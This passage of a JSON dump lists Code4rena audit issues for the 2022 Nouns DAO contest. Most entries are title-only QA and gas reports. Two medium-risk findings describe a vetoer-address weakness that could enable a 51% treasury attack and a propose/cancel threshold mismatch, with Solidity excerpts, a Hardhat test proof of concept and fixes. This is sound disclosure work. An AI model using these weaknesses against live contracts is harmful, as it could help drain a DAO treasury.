"target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/404", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/400", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/399", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/398", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/392", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/388", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/387", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/386", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/385", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/384", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/383", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/381", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/379", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/377", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/375", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/374", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/373", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/372", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/370", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/369", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/366", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/362", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/361", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/359", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/358", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/357", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/355", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/354", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/352", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/347", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/345", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/344", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/343", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/342", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/340", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/339", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/337", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/336", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/335", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/333", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/332", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/331", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/330", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/328", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/326", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/319", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/317", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/316", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Loss of Veto Power can Lead to 51% Attack", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/315", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-nounsdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L156 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L150 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L839-L845 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L637-L643   # Vulnerability details  ## Impact The veto power is import functionality for current NounsDAO in order to protect their treasury from malicious proposals.  However there is lack of zero address check and lack of 2 step address changing process for vetoer address. This might lead to Nounders losing their veto power unintentionally and open to 51% attack which can drain their entire treasury.  Refrence from Nouns DAO contest documents: https://dialectic.ch/editorial/nouns-governance-attack https://dialectic.ch/editorial/nouns-governance-attack-2  ## Proof of Concept Lack of 0-address check for vetoer address at initialize() and _setVetoer() of NounsDAOLogicV2.sol and NounsDAOLogicV1.sol. Also it is better to make changing address process of vetoer at _setVetoer() into 2-step process to avoid accidently setting vetoer to zero address or any other arbitrary addresses and end up burning/losing veto power unintentionally.  1. vetoer address of initialize() of NounsDAOLogicV2.sol, NounsDAOLogicV1.sol https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L156 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L150  2. vetoer address of _setVetoer() of NounsDAOLogicV2.sol, NounsDAOLogicV1.sol https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L839-L845 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L637-L643  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps Add zero address check for vetoer address at initialize(). Also change _setVetoer() vetoer address changing process to 2-step process like explained below.  First make the _setVetoer() function approve a new vetoer address as a pending vetoer. Next that pending vetoer has to claim the ownership in a separate transaction to be a new vetoer."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/312", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/311", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Dynamic quorum threshold may be abused as minority veto", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/310", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Dynamic quorum threshold may be abused as minority veto"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/309", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/308", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/307", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/306", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/305", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/304", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/301", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/300", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/298", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/297", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/296", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/295", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/294", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/293", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/292", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/290", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/288", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/287", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/286", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/285", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/274", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/273", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/272", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/271", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/270", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/269", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/268", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/267", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/264", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/263", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/261", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/260", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/258", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/256", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "User A cannot cancel User B's proposal when User B's prior number of votes at relevant block is same as proposal threshold, which contradicts the fact that User B actually cannot create the proposal when the prior number of votes is same as proposal threshold", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/255", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-nounsdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L184-L279 https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L346-L368   # Vulnerability details  ## Impact When User B calls the following `propose` function for creating a proposal, it checks that User B's prior number of votes at the relevant block is larger than the proposal threshold through executing `nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold`. This means that User B cannot create the proposal when the prior number of votes and the proposal threshold are the same.  https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L184-L279 ```solidity     function propose(         address[] memory targets,         uint256[] memory values,         string[] memory signatures,         bytes[] memory calldatas,         string memory description     ) public returns (uint256) {         ProposalTemp memory temp;          temp.totalSupply = nouns.totalSupply();          temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply);          require(             nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,             'NounsDAO::propose: proposer votes below proposal threshold'         );         require(             targets.length == values.length &&                 targets.length == signatures.length &&                 targets.length == calldatas.length,             'NounsDAO::propose: proposal function information arity mismatch'         );         require(targets.length != 0, 'NounsDAO::propose: must provide actions');         require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');          temp.latestProposalId = latestProposalIds[msg.sender];         if (temp.latestProposalId != 0) {             ProposalState proposersLatestProposalState = state(temp.latestProposalId);             require(                 proposersLatestProposalState != ProposalState.Active,                 'NounsDAO::propose: one live proposal per proposer, found an already active proposal'             );             require(                 proposersLatestProposalState != ProposalState.Pending,                 'NounsDAO::propose: one live proposal per proposer, found an already pending proposal'             );         }          temp.startBlock = block.number + votingDelay;         temp.endBlock = temp.startBlock + votingPeriod;          proposalCount++;         Proposal storage newProposal = _proposals[proposalCount];         newProposal.id = proposalCount;         newProposal.proposer = msg.sender;         newProposal.proposalThreshold = temp.proposalThreshold;         newProposal.eta = 0;         newProposal.targets = targets;         newProposal.values = values;         newProposal.signatures = signatures;         newProposal.calldatas = calldatas;         newProposal.startBlock = temp.startBlock;         newProposal.endBlock = temp.endBlock;         newProposal.forVotes = 0;         newProposal.againstVotes = 0;         newProposal.abstainVotes = 0;         newProposal.canceled = false;         newProposal.executed = false;         newProposal.vetoed = false;         newProposal.totalSupply = temp.totalSupply;         newProposal.creationBlock = block.number;          latestProposalIds[newProposal.proposer] = newProposal.id;          /// @notice Maintains backwards compatibility with GovernorBravo events         emit ProposalCreated(             newProposal.id,             msg.sender,             targets,             values,             signatures,             calldatas,             newProposal.startBlock,             newProposal.endBlock,             description         );          /// @notice Updated event with `proposalThreshold` and `minQuorumVotes`         /// @notice `minQuorumVotes` is always zero since V2 introduces dynamic quorum with checkpoints         emit ProposalCreatedWithRequirements(             newProposal.id,             msg.sender,             targets,             values,             signatures,             calldatas,             newProposal.startBlock,             newProposal.endBlock,             newProposal.proposalThreshold,             minQuorumVotes(),             description         );          return newProposal.id;     } ```  After User B's proposal is created, User A can call the following `cancel` function to cancel it. When calling `cancel`, it checks that User B's prior number of votes at the relevant block is less than the proposal threshold through executing `nouns.getPriorVotes(proposal.proposer, block.number - 1) < proposal.proposalThreshold`. When User B's prior number of votes and the proposal threshold are the same, User A cannot cancel this proposal of User B. However, this contradicts the fact User B actually cannot create this proposal when the same condition holds true. In other words, if User B cannot create this proposal when the prior number of votes and the proposal threshold are the same, User A should be able to cancel User B's proposal under the same condition but it is not true. The functionality for canceling User B's proposal in this situation becomes unavailable for User A.  https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L346-L368 ```solidity     function cancel(uint256 proposalId) external {         require(state(proposalId) != ProposalState.Executed, 'NounsDAO::cancel: cannot cancel executed proposal');          Proposal storage proposal = _proposals[proposalId];         require(             msg.sender == proposal.proposer ||                 nouns.getPriorVotes(proposal.proposer, block.number - 1) < proposal.proposalThreshold,             'NounsDAO::cancel: proposer above threshold'         );          proposal.canceled = true;         for (uint256 i = 0; i < proposal.targets.length; i++) {             timelock.cancelTransaction(                 proposal.targets[i],                 proposal.values[i],                 proposal.signatures[i],                 proposal.calldatas[i],                 proposal.eta             );         }          emit ProposalCanceled(proposalId);     } ```  ## Proof of Concept Please append the following test in the `NounsDAOV2#inflationHandling` `describe` block in `test\\governance\\NounsDAO\\V2\\inflationHandling.test.ts`. This test should pass to demonstrate the described scenario. ```typescript   it(\"User A cannot cancel User B's proposal when User B's prior number of votes at relevant block is same as proposal threshold, which contradicts the fact that User B actually cannot create the proposal when the prior number of votes is same as proposal threshold\",     async () => {     // account1 has 3 tokens at the beginning     // account1 gains 2 more to own 5 tokens in total     await token.transferFrom(deployer.address, account1.address, 11);     await token.transferFrom(deployer.address, account1.address, 12);      await mineBlock();      // account1 cannot create a proposal when owning 5 tokens in total     await expect(       gov.connect(account1).propose(targets, values, signatures, callDatas, 'do nothing'),     ).to.be.revertedWith('NounsDAO::propose: proposer votes below proposal threshold');      // account1 gains 1 more to own 6 tokens in total     await token.transferFrom(deployer.address, account1.address, 13);      await mineBlock();      // account1 can create a proposal when owning 6 tokens in total     await gov.connect(account1).propose(targets, values, signatures, callDatas, 'do nothing');     const proposalId = await gov.latestProposalIds(account1.address);     expect(await gov.state(proposalId)).to.equal(0);      // other user cannot cancel account1's proposal at this moment     await expect(       gov.cancel(proposalId, {gasLimit: 1e6})     ).to.be.revertedWith('NounsDAO::cancel: proposer above threshold');          // account1 removes 1 token to own 5 tokens in total     await token.connect(account1).transferFrom(account1.address, deployer.address, 13);      await mineBlock();      // other user still cannot cancel account1's proposal when account1 owns 5 tokens in total     // this contradicts the fact that account1 cannot create a proposal when owning 5 tokens in total     await expect(       gov.cancel(proposalId, {gasLimit: 1e6})     ).to.be.revertedWith('NounsDAO::cancel: proposer above threshold');      // account1 removes another token to own 4 tokens in total     await token.connect(account1).transferFrom(account1.address, deployer.address, 12);      await mineBlock();      // other user can now cancel account1's proposal when account1 owns 4 tokens in total     await gov.cancel(proposalId, {gasLimit: 1e6})     expect(await gov.state(proposalId)).to.equal(2);   }); ```   ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L197-L200 can be changed to the following code. ```solidity         require(             nouns.getPriorVotes(msg.sender, block.number - 1) >= temp.proposalThreshold,             'NounsDAO::propose: proposer votes below proposal threshold'         ); ``` or  https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L350-L354 can be changed to the following code. ```solidity         require(             msg.sender == proposal.proposer ||                 nouns.getPriorVotes(proposal.proposer, block.number - 1) <= proposal.proposalThreshold,             'NounsDAO::cancel: proposer above threshold'         ); ```  but not both."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/253", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/250", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/248", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/243", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/240", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/239", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/238", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/237", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/234", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/233", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/231", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": 